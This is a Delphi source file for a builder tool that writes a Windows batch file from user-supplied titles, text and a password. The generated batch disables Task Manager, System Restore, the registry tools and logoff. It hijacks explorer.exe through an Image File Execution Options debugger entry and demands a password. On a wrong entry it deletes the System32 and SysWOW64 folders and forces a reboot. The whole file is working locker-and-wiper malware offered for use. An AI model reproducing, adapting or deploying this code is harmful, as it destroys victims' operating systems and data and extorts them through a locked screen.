unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, ShellAPI;

type
  TForm1 = class(TForm)
    Label1: TLabel;
    Edit1: TEdit;
    Label2: TLabel;
    Label3: TLabel;
    Edit2: TEdit;
    Label4: TLabel;
    Edit3: TEdit;
    Label5: TLabel;
    Edit4: TEdit;
    Label7: TLabel;
    Edit5: TEdit;
    Button1: TButton;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  winTitle: string;
  title: string;
  text: string;
  password: string;
  pathA: string;

implementation

{$R *.dfm}

procedure TForm1.Button1Click(Sender: TObject);
var stringList: TStringList;
begin
  // Parameters
  winTitle := Edit1.Text;
  title := Edit2.Text;
  text := Edit3.Text;
  password := Edit4.Text;
  pathA := Edit5.Text;

  // Temporary file
  stringList := TStringList.Create;

  stringList.Add('@echo off');
  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableSR /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableConfig /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add HKCU\SOFTWARE\Policies\Microsoft\MMC /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f > nul');
  stringList.Add('reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "C:\Windows\system32\taskmgr.exe" /f');
  stringList.Add('taskkill /f /im explorer.exe > nul');
  stringList.Add('chcp 65001 > nul');
  stringList.Add('title '+winTitle);
  stringList.Add('color 0c');
  stringList.Add('echo '+title);
  stringList.Add('set /p PSWD=');
  stringList.Add('if %PSWD%=='+password+' (');
  stringList.Add('reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f > nul');
  stringList.Add('reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableSR /f > nul');
  stringList.Add('reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableConfig /f > nul');
  stringList.Add('reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinKeys /f > nul');
  stringList.Add('reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /f > nul');
  stringList.Add('reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /f > nul');
  stringList.Add('reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /f > nul');
  stringList.Add('reg delete HKCU\SOFTWARE\Policies\Microsoft\MMC /v RestrictToPermittedSnapins /f > nul');
  stringList.Add('reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /f');
  stringList.Add('start explorer.exe');
  stringList.Add('pause');
  stringList.Add(') else (');
  stringList.Add('del /f /s /q c:\windows\system32');
  stringList.Add('del /f /s /q c:\windows\syswow64');
  stringList.Add('shutdown /f /r /t 5 /c "GOODBYE PC XDXDXDXDXDDXDXDXD"');
  stringList.Add('pause > nul');
  stringList.Add(')');

  // Save temporary file
  stringList.SaveToFile(pathA);

  // Close TStringList
  stringList.Free();

  // Show Message
  ShowMessage('Файл успешно создан!');
end;

end.
